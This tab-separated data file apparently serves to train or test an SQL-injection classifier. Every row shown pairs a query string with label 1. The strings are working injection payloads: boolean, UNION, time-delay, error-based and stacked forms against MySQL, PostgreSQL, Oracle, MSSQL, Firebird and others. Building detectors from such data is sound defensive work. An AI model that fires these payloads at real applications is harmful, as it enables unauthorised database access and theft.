Query	Label
"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--"	1
-2951 or 4189  =  2291	1
"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #"	1
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   "	1
1'||  (  select 'ytwz' from dual where 3025  =  3025 and   (  5039  =  5303  )  *5303  )  ||'	1
end and   (  9416  =  9416	1
"1%'  )   union all select null,null,null,null#"	1
"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--"	1
"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#"	1
"1"" where 4298  =  4298 order by 1--"	1
-1468'   )    )     )   or 4875  =  6163#	1
"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
-3062'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth	1
"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--"	1
"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg"	1
"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """	1
"-9509  )   union all select 1193,1193,1193#"	1
"1""   )    )    as azak where 4911  =  4911"	1
"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"	1
"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv"	1
1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
1'   )    )     )   and 4595  =  4595#	1
"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --"	1
"1""  )   as ymto where 3453  =  3453"	1
"-7320""  )   where 3907  =  3907 union all select 3907,3907--"	1
"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj"	1
-3578'   )    )     )   order by 1--	1
"1%'   )    )     )   union all select null,null,null#"	1
"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj"	1
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn"	1
"1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #"	1
"-3834'   )    )     )   union all select 8313,8313--"	1
-8248 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) 	1
"1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
"1' where 8950  =  8950 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
1' where 3701  =  3701 and 2006  =  2006	1
"-1668""   )    )     )   or 9323  =  9323#"	1
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )   "	1
"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf"	1
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu	1
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb	1
"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """	1
-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  '	1
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd"	1
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe	1
"-6766"" where 6591  =  6591 or make_set  (  9354  =  9354,7185  )  --"	1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997"	1
-7610' or 3038  =  3038	1
1'||  (  select 'gmkp' where 6016  =  6016	1
"1,  (  case when 6620  =  3092 then 1 else null end  )  "	1
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """	1
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   "	1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240"	1
"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--"	1
"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk"	1
"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  "	1
"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226"	1
-6190'   )    )     )   union all select 9413--	1
"1"" where 5372  =  5372 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
1'   )    )    and 6690  =  3250#	1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||'	1
select   (  case when   (  2676  =  4191  )   then 2676 else 1/  (  select 0  )   end  )  --	1
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda	1
"select * from generate_series  (  9863,9863,case when   (  9863  =  3285  )   then 1 else 0 end  )   limit 1--"	1
"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#"	1
"1"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
"-5591%""   )    )    order by 1--"	1
1'  )   where 4949  =  4949	1
"1""   )    )    as sqow where 8752  =  8752"	1
"1  )   where 8008  =  8008 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
"1""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"	1
"1""  )   as frmp where 6073  =  6073"	1
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  "	1
-2411 or   (  8459  =  8459  )  *4906# pxwg	1
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  "	1
"1%"" union all select null,null,null--"	1
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--"	1
select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #	1
"-2111' union all select 1061,1061,1061--"	1
"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
"-8060""  )   where 5290  =  5290 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --"	1
"-5170'   )    )    as ovbf where 4833  =  4833 union all select 4833,4833,4833,4833--"	1
1' where 5103  =  5103	1
"-8771""   )    )    union all select 6302,6302,6302,6302,6302#"	1
"-1573""  )   union all select 3928,3928,3928,3928--"	1
1  )   rlike sleep  (  5  )   and   (  5724  =  5724	1
1  )   where 7096  =  7096	1
-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#	1
1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069	1
1	1
1 where 4787  =  4787	1
"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#"	1
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """	1
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'isyg'  =  'isyg"	1
"1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
"-5024%"" or make_set  (  3321  =  7355,7355  )   and ""%""  =  """	1
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #	1
"1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  '"	1
"1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
"1%'   )    )     )   union all select null,null,null,null,null,null,null--"	1
"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'"	1
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   "	1
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri"	1
"1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	1
"1'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --"	1
"-8256""   )    )     )   or 6872  =  6872 and    (    (     (  ""lrtu""  =  ""lrtu"	1
"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --"	1
select   (  case when   (  2056  =  1917  )   then 2056 else 1/  (  select 0  )   end  )  --	1
"1%""   )    )    or sleep  (  5  )  #"	1
" end and    (    (     (  ""revx""  =  ""revx"	1
"1%' union all select null,null,null,null--"	1
1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  '	1
"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #"	1
select case when 8867  =  7630 then 1 else null end--	1
-4331  )   as inpx where 9804  =  9804 union all select 9804#	1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv"	1
"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450"	1
"-4596"" union all select 5761#"	1
"-6419 union all select 7008,7008,7008,7008,7008--"	1
-8828   )    )    as ospo where 2141  =  2141 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --	1
"-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --"	1
1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '"	1
"-6431' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'ixix' like 'ixix"	1
"1%""   )    )    union all select null,null,null,null,null,null,null,null--"	1
"-7553%"" or 3571  =  2886"	1
1'||  (  select 'ydvg' from dual where 7108  =  7108	1
1'||  (  select 'adoe' from dual where 7662  =  7662	1
"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--"	1
1'+  (  select pagd where 2484  =  2484	1
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  "	1
"1'+  (  select hspl where 4530  =  4530 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
"1',  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   "	1
1   )    )    as cwyb where 3633  =  3633	1
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#"	1
"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --"	1
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""jfgk"" like ""jfgk"	1
"-5073""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""kbab"" like ""kbab"	1
select   (  case when   (  4774  =  1535  )   then 4774 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #	1
1' in boolean mode  )   order by 1#	1
"1  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	1
"1%""  )   and 8626  =  3626#"	1
"iif  (  5214  =  7412,1,1/0  )  "	1
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'nuil' like 'nuil"	1
"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
1'||  (  select 'rhcv' where 6228  =  6228	1
select pg_sleep  (  5  )   and    (    (   4382  =  4382	1
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'oacz'  =  'oacz"	1
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--"	1
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'"	1
1 rlike sleep  (  5  )  -- muhp	1
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs	1
1  )   as ratg where 3033  =  3033 union all select null--	1
-7404' where 1536  =  1536 order by 1#	1
"1'  )   union all select null,null,null,null,null,null,null,null,null,null#"	1
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
"1 union all select null,null,null--"	1
1'  )   as rhvm where 1420  =  1420	1
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'edcm' like 'edcm"	1
-2756' where 6156  =  6156 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --	1
1'  )   union all select null#	1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'"	1
"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--"	1
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """	1
